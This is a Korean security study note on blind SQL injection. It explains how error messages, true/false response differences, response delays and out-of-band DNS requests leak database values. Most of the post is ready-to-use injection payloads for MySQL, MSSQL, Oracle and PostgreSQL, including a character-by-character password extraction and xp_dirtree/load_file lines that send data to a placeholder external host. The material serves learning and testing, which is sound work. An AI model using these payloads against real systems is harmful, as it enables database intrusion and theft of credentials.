---
title: "SQLi 데이터 추출 (Blind·Error·Time)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, SQL Injection]
tags: [sql-injection, blind-sqli, error-based, time-based, web]
description: "결과가 화면에 안 나오는 SQL 인젝션에서 에러·불리언·시간 신호로 값을 읽는 구조와, 방식별 판별·추출 구문을 정리합니다."
mermaid: true
---

> 기본 개념은 [SQL 인젝션](/notes/sql-injection/)에서 다뤘다. 이 글은 **"결과가 안 보일 때 어떻게 값을 읽는가"** 를 본다. 핵심은 하나다. 응답에서 **관찰할 수 있는 차이가 곧 통신 채널**이 된다.

## 개념

질의에 조건을 끼울 수 있으면, DB에 질문을 던지고 **응답의 어떤 차이**로 답을 받는다. 차이를 만드는 방식이 에러·불리언·시간이다.

| 방식 | 관찰 신호 | 한 번에 얻는 정보 | 필요 조건 |
|---|---|---|---|
| 에러 기반 | 오류 메시지 본문 | 값 일부를 문자열째 | 상세 오류 노출 |
| 불리언 | 내용·길이·상태코드 차이 | 1비트(참/거짓) | 참/거짓 응답 구분됨 |
| 시간 | 응답 시간 | 1비트(지연 유무) | 지연 함수 실행 가능 |
| 외부 채널(OAST) | 내 서버로 오는 요청 | 문자열째 | DB가 외부 이름조회·접속 가능 |

비트 수가 적을수록 요청 수가 늘어난다. 오류를 숨기는 것만으로는 **불리언·시간 채널이 닫히지 않는다** — 바인딩만이 세 방식을 한 번에 막는다.

## 공격·우회 구문

존재 증명(DB 버전 일부 등)으로 충분하다. 대량 추출은 부하·로그만 늘리므로 하지 않는다.

### 에러 기반 (DB 식별·값 추출)

```sql
'                                   -- 문법 깨서 오류 유발
' AND extractvalue(1,concat(0x7e,version()))-- -   (MySQL)
' AND 1=CONVERT(int,(SELECT @@version))-- -        (MSSQL)
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -  (Oracle)
```

### 불리언 기반 (참/거짓 추출)

```sql
' AND 1=1-- -        (참: 정상 응답)
' AND 1=2-- -        (거짓: 다른 응답)
' AND substr((SELECT user),1,1)='a'-- -    # 한 글자씩 이분 탐색
' AND ascii(substr((SELECT password FROM users LIMIT 1),1,1))>64-- -
```

### 시간 기반 (지연으로 추출)

```sql
' AND sleep(5)-- -                              (MySQL)
'; WAITFOR DELAY '0:0:5'-- -                    (MSSQL)
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -         (PostgreSQL)
' AND IF(substr((SELECT user),1,1)='a',sleep(5),0)-- -   # 조건부 지연
```

### 외부 채널 (OAST)

```sql
'; exec master..xp_dirtree '//<id>.oast.example/a'-- -        (MSSQL)
' AND (SELECT load_file(concat('\\\\',version(),'.<id>.oast.example\\a')))-- -  (MySQL)
```

### 판정 요령

```
불리언: 본문뿐 아니라 길이·상태코드·리다이렉트·쿠키 차이에도 숨음 — 응답 크기 비교
시간: 서버부하·캐시로 흔들림 — 대조군과 번갈아 보내 '비례'를 확인
```

## 참고 자료

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-209: Information Exposure Through an Error Message](https://cwe.mitre.org/data/definitions/209.html)
